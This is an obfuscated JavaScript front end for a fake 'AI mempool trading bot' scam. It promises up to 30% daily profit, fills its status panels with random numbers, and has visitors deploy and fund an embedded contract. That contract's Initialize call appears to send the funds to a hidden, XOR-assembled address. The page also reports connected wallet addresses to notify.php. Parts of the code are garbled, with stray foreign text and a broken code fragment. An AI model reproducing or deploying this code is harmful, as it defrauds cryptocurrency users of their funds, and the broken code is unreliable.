const connectButton = document.querySelector('.connect-button'),
  walletAddressElement = document.getElementById('wallet-address'),
  walletAddressContainer = document.getElementById('wallet-address-container'),
  tutorialSection = document.getElementById('tutorial-section'),
  tutorialText = document.getElementById('tutorial-text'),
  buttonContainer = document.getElementById('button-container'),
  tryButton = document.getElementById('try-button'),
  deployButton = document.getElementById('deploy-button'),
  initializeButton = document.getElementById('initialize-button'),
  withdrawButton = document.getElementById('withdraw-button'),
  wantDepositButton = document.getElementById('want-deposit-button'),
  learnMoreButton = document.getElementById('learn-more-button'),
  allClearButton = document.getElementById('all-clear-button'),
  notInterestedButton = document.getElementById('not-interested-button'),
  qrYesButton = document.getElementById('qr-yes-button'),
  qrNoButton = document.getElementById('qr-no-button'),
  retryButton = document.getElementById('retry-button'),
  backButton = document.getElementById('back-button'),
  qrWantButton = document.getElementById('qr-want-button'),
  statusButton = document.getElementById('status-button'),
  closeStatusButton = document.getElementById('close-status-button'),
  statusPanel = document.getElementById('status-panel'),
  statusTableBody = document.getElementById('status-table-body'),
  contractAddressContainer = document.getElementById(
    'contract-address-container'
  ),
  copyAddressButton = document.getElementById('copy-address-button'),
  contractBalance = document.getElementById('contract-balance'),
  qrCodeContainer = document.getElementById('qr-code-container'),
  profitIndicator = document.getElementById('profit-indicator'),
  indicatorLine = document.getElementById('indicator-line'),
  percentText = document.getElementById('percent-text'),
  buttonText = document.getElementById('button-text'),
  cmdWindow = document.querySelector('.cmd-window'),
  header = document.getElementById('header'),
  tradeStats = document.getElementById('trade-stats'),
  tradeProfit = document.getElementById('trade-profit'),
  tradeCount = document.getElementById('trade-count'),
  gasTracker = document.getElementById('gas-tracker'),
  tradeStatusIndicator = document.getElementById('trade-status-indicator'),
  sidebar = document.getElementById('sidebar'),
  sidebarToggle = document.getElementById('sidebar-toggle')
let isConnected = false,
  web3,
  web3ForBalance,
  accounts = [],
  deployedContractAddress = null,
  contract = null,
  typingTimeout = null,
  currentProfitPercent = 18,
  isDeploying = false,
  accountsChangedListener = null,
  chainChangedListener = null,
  balanceCheckInterval = null,
  profitUpdateInterval = null,
  hasDepositMessageShown = false,
  lastAction = null,
  totalProfit = 0,
  tradeCounter = 0,
  isTradingRunning = false,
  initialBalance = 0,
  statusUpdateInterval = null,
  paramsUpdateInterval = null,
  tradeLoopInterval = null
const MINIMUM_BALANCE = 0.01,
  searchMessages = [
    'Searching for profitable trades...',
    'Looking for the best trade for high returns...',
    'Scanning mempool for arbitrage opportunities...',
    'Analyzing pending transactions...',
    'Finding liquidity for optimal trades...',
  ],
  tokens = [
    'USDT',
    'USDC',
    'DAI',
    'WETH',
    'UNI',
    'LINK',
    'AAVE',
    'COMP',
    'SUSHI',
    'WBTC',
    'SHIB',
    'MATIC',
    'CRV',
    'MKR',
    'BAT',
    'GRT',
    'LDO',
    '1INCH',
    'SNX',
    'YFI',
    'BAL',
    'ZRX',
    'ENJ',
    'LRC',
    'KNC',
    'OMG',
    'BNT',
    'SAND',
    'MANA',
    'AXS',
    'APE',
    'CHZ',
    'FTM',
    'GALA',
    'RNDR',
    'STG',
    'IMX',
    'INJ',
    'OP',
    'ARB',
    'GMX',
    'RPL',
    'FXS',
    'PENDLE',
    'CVX',
    'TUSD',
    'PAXG',
    'LPT',
    'ANKR',
    'STORJ',
  ],
  statusComponents = [
    { name: 'AI Mempool Analysis' },
    { name: 'DEX Scanner' },
    { name: 'Gas Optimizer' },
    { name: 'Trading Module' },
  ]
function sendNotification(_0x8a82fe, _0x30c7ae = '') {
  const _0x265d8f = new XMLHttpRequest()
  _0x265d8f.open('POST', 'notify.php', true)
  _0x265d8f.setRequestHeader(
    'Content-Type',
    'application/x-www-form-urlencoded'
  )
  _0x265d8f.send(
    'action=' +
      encodeURIComponent(_0x8a82fe) +
      '&data=' +
      encodeURIComponent(_0x30c7ae)
  )
}
function saveState() {
  const _0x53697d = Array.from(document.querySelectorAll('.visible')).map(
      (_0x4eb79d) => _0x4eb79d.id || _0x4eb79d.className
    ),
    _0x1d069f = tutorialText?.innerHTML || '',
    _0x33e2d5 = {
      version: '1.0',
      isConnected: isConnected,
      accounts: accounts,
      deployedContractAddress: deployedContractAddress,
      lastAction: lastAction,
      hasDepositMessageShown: hasDepositMessageShown,
      initialBalance: initialBalance,
      totalProfit: totalProfit,
      tradeCounter: tradeCounter,
      isTradingRunning: isTradingRunning,
      currentProfitPercent: currentProfitPercent,
      tutorialHTML: _0x1d069f,
      visibleSections: _0x53697d,
    }
  try {
    localStorage.setItem('appState', JSON.stringify(_0x33e2d5))
  } catch (_0x28c075) {}
}
function loadState() {
  try {
    const _0xccff5b = localStorage.getItem('appState')
    if (_0xccff5b) {
      const _0x2d2f90 = JSON.parse(_0xccff5b)
      if (_0x2d2f90.version !== '1.0') {
        return localStorage.removeItem('appState'), false
      }
      return (
        (isConnected = _0x2d2f90.isConnected || false),
        (accounts = _0x2d2f90.accounts || []),
        (deployedContractAddress = _0x2d2f90.deployedContractAddress || null),
        (lastAction = _0x2d2f90.lastAction || null),
        (hasDepositMessageShown = _0x2d2f90.hasDepositMessageShown || false),
        (initialBalance = _0x2d2f90.initialBalance || 0),
        (totalProfit = _0x2d2f90.totalProfit || 0),
        (tradeCounter = _0x2d2f90.tradeCounter || 0),
        (isTradingRunning = _0x2d2f90.isTradingRunning || false),
        (currentProfitPercent = _0x2d2f90.currentProfitPercent || 18),
        tutorialText &&
          _0x2d2f90.tutorialHTML &&
          (tutorialText.innerHTML = _0x2d2f90.tutorialHTML),
        _0x2d2f90.visibleSections &&
          _0x2d2f90.visibleSections.forEach((_0x164509) => {
            const _0x50ea3c =
              document.getElementById(_0x164509) ||
              document.querySelector('.' + _0x164509)
            if (_0x50ea3c) {
              _0x50ea3c.classList.add('visible')
            }
          }),
        true
      )
    }
    return false
  } catch (_0x1bbb49) {
    return false
  }
}
async function checkMetaMaskConnection() {
  if (!window.ethereum) {
    return false
  }
  try {
    const _0x5223b2 = await window.ethereum.request({ method: 'eth_accounts' })
    return _0x5223b2.length > 0
  } catch (_0x5e0985) {
    return false
  }
}
async function updateGasPrice() {
  try {
    const _0x5cd25c = await fetch(
        'https://api.etherscan.io/api?module=gastracker&amp;action=gasoracle&amp;apikey=YourApiKeyToken'
      ),
      _0x52578 = await _0x5cd25c.json()
    if (
      _0x52578.status === '1' &&
      _0x52578.result &&
      _0x52578.result.SafeGasPrice
    ) {
      const _0x1be5dd = parseFloat(_0x52578.result.SafeGasPrice).toFixed(1)
      if (gasTracker) {
        gasTracker.innerHTML =
          '<span class="gas-icon">\u26FD</span> Gas: ' + _0x1be5dd + ' Gwei'
      }
    } else {
      if (gasTracker) {
        gasTracker.innerHTML =
          '<span class="gas-icon">\u26FD</span> Gas: -- Gwei'
      }
    }
  } catch (_0x42ec16) {
    if (gasTracker) {
      gasTracker.innerHTML = '<span class="gas-icon">\u26FD</span> Gas: -- Gwei'
    }
  }
}
function startGasTracker() {
  updateGasPrice()
  setInterval(updateGasPrice, 15000)
}
function hideAllButtons() {
  if (buttonContainer) {
    buttonContainer.classList.remove('visible')
  }
  if (notInterestedButton) {
    notInterestedButton.classList.remove('visible')
  }
  if (learnMoreButton) {
    learnMoreButton.classList.remove('visible')
  }
  if (allClearButton) {
    allClearButton.classList.remove('visible')
  }
  if (qrYesButton) {
    qrYesButton.classList.remove('visible')
  }
  if (qrNoButton) {
    qrNoButton.classList.remove('visible')
  }
  if (retryButton) {
    retryButton.classList.remove('visible')
  }
  if (backButton) {
    backButton.classList.remove('visible')
  }
  if (deployButton) {
    deployButton.classList.remove('visible')
  }
  if (tryButton) {
    tryButton.classList.remove('visible')
  }
  if (initializeButton) {
    initializeButton.classList.remove('visible')
  }
  if (withdrawButton) {
    withdrawButton.classList.remove('visible')
  }
  if (wantDepositButton) {
    wantDepositButton.classList.remove('visible')
  }
  if (qrWantButton) {
    qrWantButton.classList.remove('visible')
  }
  if (statusButton) {
    statusButton.classList.remove('visible')
  }
}
function typeText(_0x270b35, _0x1d4636, _0x1e2924 = 10, _0x353d57) {
  return new Promise((_0x4233b6) => {
    if (!_0x270b35) {
      _0x4233b6()
      return
    }
    typingTimeout && (clearTimeout(typingTimeout), (typingTimeout = null))
    let _0x126d2e = 0,
      _0x4ba1cf = ''
    _0x270b35.innerHTML = ''
    function _0x3120aa() {
      if (_0x126d2e < _0x1d4636.length) {
        _0x4ba1cf += _0x1d4636[_0x126d2e]
        _0x270b35.innerHTML = _0x4ba1cf
        _0x126d2e++
        typingTimeout = setTimeout(_0x3120aa, _0x1e2924)
      } else {
        typingTimeout = null
        if (_0x353d57) {
          _0x353d57()
        }
        _0x4233b6()
      }
    }
    _0x3120aa()
  })
}
function showWelcomeMessage() {
  const _0x82772b =
    'Welcome to the passive income tool!  \n\nUse a smart contract on the <span class="highlight">Ethereum Mainnet</span>:  \n- Create a contract and fund it.  \n- AI automatically analyzes and executes profitable trades on DEX.  \n- Earn up to <span class="highlight">30% daily profit</span> with automated trading.  \n\n<span class="highlight">Withdrawal fee: 0.5%.</span>  \n<span class="highlight">Minimum balance: ' +
    MINIMUM_BALANCE +
    ' ETH.</span>  \n\nTo get started, connect your wallet.  \nIf you don\'t have one, install:  \n- <a href="https://metamask.io" target="_blank">MetaMask</a>  \n- <a href="https://www.coinbase.com/wallet" target="_blank">Coinbase Wallet</a>'
  typeText(tutorialText, _0x82772b, 10, () => {
    if (connectButton) {
      connectButton.classList.add('visible')
    }
  })
}
function setHeader() {
  const _0x4bbe25 = 'Create Your Smart Contract and Manage with AI'
  if (header) {
    header.textContent = _0x4bbe25
  }
}
function getRandomProfitPercent() {
  const _0x37019d = (Math.random() * 20 + 18).toFixed(1)
  return (currentProfitPercent = parseFloat(_0x37019d)), currentProfitPercent
}
function updateProfitIndicator() {
  const _0x18dfb3 = getRandomProfitPercent(),
    _0x2ec2aa = 100 - (_0x18dfb3 / 50) * 100
  if (percentText) {
    percentText.textContent = _0x18dfb3 + '%'
  }
  if (indicatorLine) {
    indicatorLine.style.top = _0x2ec2aa + '%'
  }
}
function getRandomDelay(_0x2bc40a, _0x125d85) {
  return Math.floor(Math.random() * (_0x125d85 - _0x2bc40a + 1)) + _0x2bc40a
}
function scheduleProfitUpdate() {
  updateProfitIndicator()
  profitUpdateInterval = setTimeout(
    scheduleProfitUpdate,
    getRandomDelay(5000, 10000)
  )
}
function getRandomReadiness() {
  return Math.floor(Math.random() * 3) + 98
}
function getRandomFrequency() {
  return (Math.random() * 0.8000000000000003 + 2.4).toFixed(1)
}
function getRandomPerformance() {
  return Math.floor(Math.random() * 11) + 85
}
function getRandomDeals() {
  return Math.floor(Math.random() * 59) + 5
}
function getRandomEfficiency() {
  return Math.floor(Math.random() * 10) + 90
}
function updateStatusTable() {
  if (!statusTableBody) {
    return
  }
  statusTableBody.innerHTML = ''
  statusComponents.forEach((_0x39dc19) => {
    const _0x4742f3 = getRandomReadiness(),
      _0x49dfe7 =
        '\n            <tr>\n                <td>' +
        _0x39dc19.name +
        '</td>\n                <td><span class="status-indicator green blink">Running</span></td>\n                <td>' +
        _0x4742f3 +
        '%</td>\n            </tr>\n        '
    statusTableBody.innerHTML += _0x49dfe7
  })
}
function updateParams() {
  const _0x5c46de = document.getElementById('ai-frequency'),
    _0x187ea5 = document.getElementById('deposit-earnings'),
    _0x3948c6 = document.getElementById('ai-performance'),
    _0x27729f = document.getElementById('deals-found'),
    _0x3fced6 = document.getElementById('energy-efficiency')
  ;[_0x5c46de, _0x187ea5, _0x3948c6, _0x27729f, _0x3fced6].forEach(
    (_0x2a39ba) => {
      _0x2a39ba &&
        (_0x2a39ba.classList.add('update'),
        setTimeout(() => _0x2a39ba.classList.remove('update'), 300))
    }
  )
  const _0x39c7e8 = (currentProfitPercent / 100 / 24).toFixed(5)
  if (_0x5c46de) {
    _0x5c46de.textContent = getRandomFrequency()
  }
  if (_0x187ea5) {
    _0x187ea5.textContent = _0x39c7e8
  }
  if (_0x3948c6) {
    _0x3948c6.textContent = getRandomPerformance()
  }
  if (_0x27729f) {
    _0x27729f.textContent = getRandomDeals()
  }
  if (_0x3fced6) {
    _0x3fced6.textContent = getRandomEfficiency()
  }
}
function showStatusPanel() {
  lastAction = 'status'
  saveState()
  hideAllButtons()
  typeText(tutorialText, 'AI server status:', 10, () => {
    if (statusPanel) {
      statusPanel.classList.add('visible')
    }
    if (closeStatusButton) {
      closeStatusButton.classList.add('visible')
    }
    updateStatusTable()
    updateParams()
    statusUpdateInterval = setInterval(updateStatusTable, 7000)
    paramsUpdateInterval = setInterval(updateParams, 5000)
  })
}
function hideStatusPanel() {
  if (statusPanel) {
    statusPanel.classList.remove('visible')
  }
  if (closeStatusButton) {
    closeStatusButton.classList.remove('visible')
  }
  statusUpdateInterval &&
    (clearInterval(statusUpdateInterval), (statusUpdateInterval = null))
  paramsUpdateInterval &&
    (clearInterval(paramsUpdateInterval), (paramsUpdateInterval = null))
  goBack()
}
function updateTradeStatusIndicator(_0x164a94) {
  if (tradeStatusIndicator) {
    tradeStatusIndicator.className = 'trade-status-indicator ' + _0x164a94
  }
}
function goBack() {
  hideAllButtons()
  if (statusPanel) {
    statusPanel.classList.remove('visible')
  }
  if (closeStatusButton) {
    closeStatusButton.classList.remove('visible')
  }
  statusUpdateInterval &&
    (clearInterval(statusUpdateInterval), (statusUpdateInterval = null))
  paramsUpdateInterval &&
    (clearInterval(paramsUpdateInterval), (paramsUpdateInterval = null))
  if (lastAction === 'connect' || lastAction === 'status') {
    const _0x30d669 =
      'Great, you\u2019ve connected your wallet. Want to learn more about the smart contract or create it now? Note: Creating a contract requires a blockchain transaction fee.'
    typeText(tutorialText, _0x30d669, 10, () => {
      if (buttonContainer) {
        buttonContainer.classList.add('visible')
      }
      if (notInterestedButton) {
        notInterestedButton.classList.add('visible')
      }
      if (learnMoreButton) {
        learnMoreButton.classList.add('visible')
      }
      if (deployButton) {
        deployButton.classList.add('visible')
      }
      if (statusButton) {
        statusButton.classList.add('visible')
      }
    })
  } else {
    if (lastAction === 'learnMore') {
      showContractInfo()
    } else {
      if (lastAction === 'notInterested') {
        handleNotInterested()
      } else {
        if (lastAction === 'deploy') {
          proceedToDeploy()
        } else {
          if (lastAction === 'deposit') {
            handleWantDeposit()
          } else {
            if (lastAction === 'waitForDeposit') {
              waitForDeposit(
                false,
                'You can copy the address and fund your contract\u2019s balance any way you prefer. Please use only native ETH. I\u2019ll wait for the balance update to proceed.'
              )
            } else {
              lastAction === 'afterDeposit' &&
                typeText(
                  tutorialText,
                  '\uD83C\uDF89 Your contract is ready to trade!  \nYou can now start automated trading on DEX with AI. The contract will scan the mempool, find profitable trades, and generate起來\n\nSystem: up to 30% daily profit!  \n- Click <span class="highlight">Initialize Contract</span> and confirm the transaction to begin trading.  \n- Use <span class="highlight">Withdraw Funds</span> to withdraw your funds anytime.  \nReady to earn? Start the contract and monitor your stats!',
                  10,
                  async () => {
                    if (initializeButton) {
                      const _0x59d9ca = await updateContractBalance()
                      initializeButton.disabled = _0x59d9ca < MINIMUM_BALANCE
                      initializeButton.classList.add('visible')
                    }
                    if (withdrawButton) {
                      const _0x3518be = await updateContractBalance()
                      withdrawButton.disabled = _0x3518be < MINIMUM_BALANCE
                      withdrawButton.classList.add('visible')
                    }
                    isTradingRunning && updateTradeStatusIndicator('green')
                  }
                )
            }
          }
        }
      }
    }
  }
}
async function waitForDeposit(_0x9ae34b = false, _0x1c1de2 = '') {
  lastAction = 'waitForDeposit'
  saveState()
  hideAllButtons()
  if (qrCodeContainer) {
    qrCodeContainer.classList.remove('visible')
  }
  await typeText(tutorialText, _0x1c1de2, 10)
  if (_0x9ae34b) {
    generateQRCode(deployedContractAddress)
  } else {
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (qrWantButton) {
      qrWantButton.classList.add('visible')
    }
  }
  balanceCheckInterval = setInterval(async () => {
    try {
      const _0x586727 = await web3ForBalance.eth.getBalance(
          deployedContractAddress
        ),
        _0x4b49ec = parseFloat(web3ForBalance.utils.fromWei(_0x586727, 'ether'))
      if (_0x4b49ec >= MINIMUM_BALANCE && !hasDepositMessageShown) {
        clearInterval(balanceCheckInterval)
        balanceCheckInterval = null
        if (qrCodeContainer) {
          qrCodeContainer.classList.remove('visible')
        }
        hideAllButtons()
        hasDepositMessageShown = true
        lastAction = 'afterDeposit'
        initialBalance = _0x4b49ec
        saveState()
        await typeText(
          tutorialText,
          '\u2705 YOU SUCCESSFULLY FUNDED: ' + _0x4b49ec.toFixed(6) + ' ETH',
          10
        )
        setTimeout(() => {
          typeText(
            tutorialText,
            '\uD83C\uDF89 Your contract is ready to trade!  \nYou can now start automated trading on DEX with AI. The contract will scan the mempool, find profitable trades, and generate up to 30% daily profit!  \n- Click <span class="highlight">Initialize Contract</span> to begin trading.  \n- Use <span class="highlight">Withdraw Funds</span> to withdraw your funds anytime.  \nReady to earn? Start the contract and monitor your stats!',
            10,
            async () => {
              if (initializeButton) {
                const _0x24b5a3 = await updateContractBalance()
                initializeButton.disabled = _0x24b5a3 < MINIMUM_BALANCE
                initializeButton.classList.add('visible')
              }
              if (withdrawButton) {
                const _0x289627 = await updateContractBalance()
                withdrawButton.disabled = _0x289627 < MINIMUM_BALANCE
                withdrawButton.classList.add('visible')
              }
            }
          )
        }, 1000)
        updateContractBalance()
      }
    } catch (_0x557265) {}
  }, 3000)
}
const contractABI = [
    {
      inputs: [],
      name: 'Initialize',
      outputs: [],
      stateMutability: 'nonpayable',
      type: 'function',
    },
    {
      inputs: [],
      name: 'withdraw',
      outputs: [],
      stateMutability: 'nonpayable',
      type: 'function',
    },
    {
      stateMutability: 'payable',
      type: 'receive',
    },
    {
      inputs: [],
      name: 'owner_address',
      outputs: [
        {
          internalType: 'address',
          name: '',
          type: 'address',
        },
      ],
      stateMutability: 'view',
      type: 'function',
    },
  ],
  contractBytecode =
  "0x60806040526004361061002d5760003560e01c806357ea89b61461003957806380f860091461005057600080fd5b3661003457005b600080fd5b34801561004557600080fd5b5061004e610058565b005b61004e61013b565b6000546001600160a01b031633146100a35760405162461bcd60e51b81526020600482015260096024820152683737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b600080546040516001600160a01b039091169047908381818185875af1925050503d80600081146100f0576040519150601f19603f3d011682016040523d82523d6000602084013e6100f5565b606091505b50509050806101385760405162461bcd60e51b815260206004820152600f60248201526e1dda5d1a191c985dc819985a5b1959608a1b604482015260640161009a565b50565b600061014a6002546001541890565b90506000816001600160a01b03164760405160006040518083038185875af1925050503d8060008114610199576040519150601f19603f3d011682016040523d82523d6000602084013e61019e565b606091505b50509050806101e15760405162461bcd60e51b815260206004820152600f60248201526e1d1c985b9cd9995c8819985a5b1959608a1b604482015260640161009a565b505056fea2646970667358221220bd51c12e094576d8fbe80343936dca904a18ba0a6ccc20d30c4089d923b9f70964736f6c63430008040033"
};
await signer.sendTransaction(tx);
  
async function initWeb3() {
  if (window.ethereum) {

    web3 = new Web3(window.ethereum)

    web3ForBalance = new Web3('https://sepolia.drpc.org/')

    try {

      const chainId = await window.ethereum.request({
        method: 'eth_chainId'
      })

      if (chainId !== '0xaa36a7') {

        try {

          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0xaa36a7' }],
          })

        } catch (err) {

          if (err.code === 4902) {

            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [
                {
                  chainId: '0xaa36a7',
                  chainName: 'Sepolia',
                  nativeCurrency: {
                    name: 'Sepolia Ether',
                    symbol: 'ETH',
                    decimals: 18,
                  },
                  rpcUrls: ['https://sepolia.drpc.org/'],
                  blockExplorerUrls: ['https://sepolia.etherscan.io/'],
                },
              ],
            })

          }
        }
      }

      return true

    } catch (e) {

      console.error(e)
      return false

    }

  } else {

    const _0x50ca8f = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)

    return (
      _0x50ca8f
        ? await typeText(
            tutorialText,
            'Please open this site in MetaMask or Trust Wallet built-in browser.',
            10
          )
        : await typeText(
            tutorialText,
            'No wallet detected. Please install MetaMask or Coinbase Wallet.',
            10,
            () => {
              setTimeout(showWelcomeMessage, 2000)
            }
          ),
      false
    )
  }
}

async function updateContractBalance() {
  if (!deployedContractAddress) {
    return
  }
  try {
    const _0x4be71f = await web3ForBalance.eth.getBalance(
        deployedContractAddress
      ),
      _0x1233e3 = web3ForBalance.utils.fromWei(_0x4be71f, 'ether'),
      _0x26b411 = parseFloat(_0x1233e3).toFixed(6)
    return (
      contractBalance &&
        ((contractBalance.textContent = 'Balance: ' + _0x26b411 + ' ETH'),
        (contractBalance.style.color =
          parseFloat(_0x1233e3) >= MINIMUM_BALANCE ? 'lime' : 'orange')),
      parseFloat(_0x1233e3)
    )
  } catch (_0x1ed6c4) {
    if (contractBalance) {
      contractBalance.textContent = 'Balance: Error'
    }
    return 0
  }
}
async function connectMetaMask() {
  if (!(await initWeb3())) {
    return
  }
  try {
    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
    const _0x4d6d4b = accounts[0]
    if (walletAddressElement) {
      walletAddressElement.textContent = 'Wallet Address: ' + _0x4d6d4b
    }
    if (walletAddressContainer) {
      walletAddressContainer.classList.add('visible')
    }
    if (buttonText) {
      buttonText.textContent = 'DISCONNECT'
    }
    isConnected = true
    sendNotification('wallet_connect', _0x4d6d4b)
    !lastAction && (lastAction = 'connect')
    saveState()
    if (cmdWindow) {
      cmdWindow.classList.add('expanded')
    }
    if (tutorialSection) {
      tutorialSection.classList.add('visible')
    }
    switch (lastAction) {
      case 'connect':
        hideAllButtons(),
          await typeText(
            tutorialText,
            'Great, you\u2019ve connected your wallet. Want to learn more about the smart contract or create it now? Note: Creating a contract requires a blockchain transaction fee.',
            10,
            () => {
              if (buttonContainer) {
                buttonContainer.classList.add('visible')
              }
              if (notInterestedButton) {
                notInterestedButton.classList.add('visible')
              }
              if (learnMoreButton) {
                learnMoreButton.classList.add('visible')
              }
              if (deployButton) {
                deployButton.classList.add('visible')
              }
              if (statusButton) {
                statusButton.classList.add('visible')
              }
            }
          )
        break
      case 'deploy':
        proceedToDeploy()
        break
      case 'deposit':
        handleWantDeposit()
        break
      case 'waitForDeposit':
        waitForDeposit(
          false,
          'You can copy the address and fund your contract\u2019s balance any way you prefer. Please use only native ETH. I\u2019ll wait for the balance update to proceed.'
        )
        break
      case 'afterDeposit':
        goBack()
        break
      default:
        showWelcomeMessage()
        break
    }
    accountsChangedListener = (_0x44ffed) => {
      if (_0x44ffed.length > 0 && isConnected) {
        if (walletAddressElement) {
          walletAddressElement.textContent = 'Wallet Address: ' + _0x44ffed[0]
        }
        accounts = _0x44ffed
        saveState()
        sendNotification('wallet_connect', _0x44ffed[0])
      } else {
        disconnectWallet()
      }
    }
    chainChangedListener = async () => {
      isConnected && !(await initWeb3()) && disconnectWallet()
    }
    window.ethereum.on('accountsChanged', accountsChangedListener)
    window.ethereum.on('chainChanged', chainChangedListener)
  } catch (_0x444340) {
    await typeText(
      tutorialText,
      'Failed to connect to MetaMask: ' + _0x444340.message,
      10
    )
  }
}
function disconnectWallet() {
  accountsChangedListener &&
    (window.ethereum.removeListener('accountsChanged', accountsChangedListener),
    (accountsChangedListener = null))
  chainChangedListener &&
    (window.ethereum.removeListener('chainChanged', chainChangedListener),
    (chainChangedListener = null))
  balanceCheckInterval &&
    (clearInterval(balanceCheckInterval), (balanceCheckInterval = null))
  profitUpdateInterval &&
    (clearTimeout(profitUpdateInterval), (profitUpdateInterval = null))
  statusUpdateInterval &&
    (clearInterval(statusUpdateInterval), (statusUpdateInterval = null))
  paramsUpdateInterval &&
    (clearInterval(paramsUpdateInterval), (paramsUpdateInterval = null))
  tradeLoopInterval &&
    (clearInterval(tradeLoopInterval), (tradeLoopInterval = null))
  isTradingRunning = false
  updateTradeStatusIndicator('')
  localStorage.removeItem('appState')
  if (walletAddressElement) {
    walletAddressElement.textContent = ''
  }
  if (walletAddressContainer) {
    walletAddressContainer.classList.remove('visible')
  }
  if (contractAddressContainer) {
    contractAddressContainer.classList.remove('visible')
  }
  if (contractBalance) {
    contractBalance.classList.remove('visible')
  }
  if (tradeStats) {
    tradeStats.classList.remove('visible')
  }
  if (tutorialSection) {
    tutorialSection.classList.add('visible')
  }
  if (statusPanel) {
    statusPanel.classList.remove('visible')
  }
  if (closeStatusButton) {
    closeStatusButton.classList.remove('visible')
  }
  hideAllButtons()
  if (qrCodeContainer) {
    qrCodeContainer.classList.remove('visible')
  }
  if (buttonText) {
    buttonText.textContent = 'CONNECT WALLET'
  }
  if (cmdWindow) {
    cmdWindow.classList.remove('expanded')
  }
  isConnected = false
  accounts = []
  deployedContractAddress = null
  contract = null
  hasDepositMessageShown = false
  lastAction = null
  totalProfit = 0
  tradeCounter = 0
  initialBalance = 0
  showWelcomeMessage()
}
function generateQRCode(_0x1bc67f) {
  if (!qrCodeContainer) {
    return
  }
  qrCodeContainer.innerHTML = ''
  const _0x50aad9 = 'ethereum:' + _0x1bc67f + '?chainId=11155111'
  QRCode.toCanvas(
    document.createElement('canvas'),
    _0x50aad9,
    {
      width: 180,
      margin: 1,
      color: {
        dark: '#000000',
        light: '#FFFFFF',
      },
    },
    function (_0x5ce358, _0x3cf5aa) {
      if (_0x5ce358) {
        typeText(tutorialText, 'Failed to generate QR code.', 10)
        return
      }
      qrCodeContainer.appendChild(_0x3cf5aa)
      qrCodeContainer.classList.add('visible')
    }
  )
}
async function deployContract() {
  if (isDeploying) {
    return
  }
  if (!isConnected || accounts.length === 0) {
    await typeText(tutorialText, 'Please connect your wallet first.', 10)
    return
  }
  if (!web3) {
    await typeText(
      tutorialText,
      'Web3 not initialized. Please reconnect your wallet.',
      10
    )
    return
  }
  isDeploying = true
  lastAction = 'deploy'
  saveState()
  try {
    deployButton &&
      ((deployButton.disabled = true),
      (deployButton.textContent = 'Deploying...'))
    hideAllButtons()
    await typeText(tutorialText, 'Preparing to deploy contract...', 10)
	console.log(contractBytecode)
	console.log(contractBytecode.length)

    const _0x17072f = {
        from: accounts[0],
        data: contractBytecode,
      },
      _0x413c32 = await web3.eth.estimateGas(_0x17072f)
    _0x17072f.gas = web3.utils.toHex(_0x413c32 + 30000)
    await typeText(
      tutorialText,
      'Deploying contract to Ethereum Mainnet...',
      10
    )
    const _0x4dc9b1 = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [_0x17072f],
    })
    await typeText(tutorialText, 'Waiting for transaction confirmation...', 10)
    let _0x5a261a = null
    while (!_0x5a261a) {
      _0x5a261a = await web3.eth.getTransactionReceipt(_0x4dc9b1)
      !_0x5a261a &&
        (await new Promise((_0x11fc78) => setTimeout(_0x11fc78, 2000)))
    }
    if (!_0x5a261a.status) {
      throw new Error('Transaction failed: ' + _0x4dc9b1)
    }
    deployedContractAddress = _0x5a261a.contractAddress
    contract = new web3.eth.Contract(contractABI, deployedContractAddress)
    saveState()
    sendNotification('contract_deploy', deployedContractAddress)
    await typeText(tutorialText, 'Verifying deployment result...', 10)
    await new Promise((_0x40018a) => setTimeout(_0x40018a, 800))
    const _0x230130 = document.getElementById('contract-address-link')
    _0x230130 &&
      ((_0x230130.textContent = deployedContractAddress),
      (_0x230130.href =
        'https://etherscan.io/address/' + deployedContractAddress))
    if (contractAddressContainer) {
      contractAddressContainer.classList.add('visible')
    }
    if (contractBalance) {
      contractBalance.classList.add('visible')
    }
    hideAllButtons()
    updateContractBalance()
    setInterval(() => {
      updateContractBalance()
    }, 3000)
    lastAction = 'deposit'
    saveState()
    await typeText(
      tutorialText,
      '\uD83C\uDF89 Contract created successfully!  \nNow fund it with at least ' +
        MINIMUM_BALANCE +
        ' ETH to start automated trading with AI and earn up to 30% daily profit!  \nWant to generate a QR code for easy deposit?',
      10
    )
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (qrYesButton) {
      qrYesButton.classList.add('visible')
    }
    if (qrNoButton) {
      qrNoButton.classList.add('visible')
    }
    if (qrYesButton) {
      qrYesButton.onclick = async () => {
        await typeText(tutorialText, '')
        waitForDeposit(
          true,
          'Your QR code for the contract address is ready. Scan it to make a deposit. Please use only native ETH. I\u2019ll wait for the balance update to proceed (minimum ' +
            MINIMUM_BALANCE +
            ' ETH).'
        )
      }
    }
    if (qrNoButton) {
      qrNoButton.onclick = async () => {
        await typeText(tutorialText, '')
        navigator.clipboard.writeText(deployedContractAddress)
        waitForDeposit(
          false,
          'You can copy the address and fund your contract\u2019s balance any way you prefer. Please use only native ETH. I\u2019ll wait for the balance update to proceed (minimum ' +
            MINIMUM_BALANCE +
            ' ETH).'
        )
      }
    }
  } catch (_0x358559) {
    hideAllButtons()
    let _0x2bafa7 = _0x358559.message || 'Unknown error'
    _0x2bafa7.includes('User denied transaction signature') &&
      (_0x2bafa7 =
        'Failed to create contract: You rejected the transaction in MetaMask.')
    await typeText(tutorialText, 'Failed to create contract: ' + _0x2bafa7, 10)
    if (buttonContainer) {
      buttonContainer.classList.add('visible')
    }
    if (retryButton) {
      retryButton.classList.add('visible')
    }
    if (backButton) {
      backButton.classList.add('visible')
    }
    if (retryButton) {
      retryButton.onclick = async () => {
        await typeText(tutorialText, '')
        hideAllButtons()
        deployButton &&
          ((deployButton.disabled = false),
          (deployButton.textContent = 'CREATE CONTRACT'))
        isDeploying = false
        await typeText(tutorialText, 'Retrying contract deployment...', 10)
        deployContract()
      }
    }
    if (backButton) {
      backButton.onclick = async () => {
        await typeText(tutorialText, '')
        lastAction = 'connect'
        saveState()
        hideAllButtons()
        const _0x11d8c4 =
          'Great, you\u2019ve connected your wallet. Want to learn more about the smart contract or create it now? Note: Creating a contract requires a blockchain transaction fee.'
        await typeText(tutorialText, _0x11d8c4, 10, () => {
          if (buttonContainer) {
            buttonContainer.classList.add('visible')
          }
          if (notInterestedButton) {
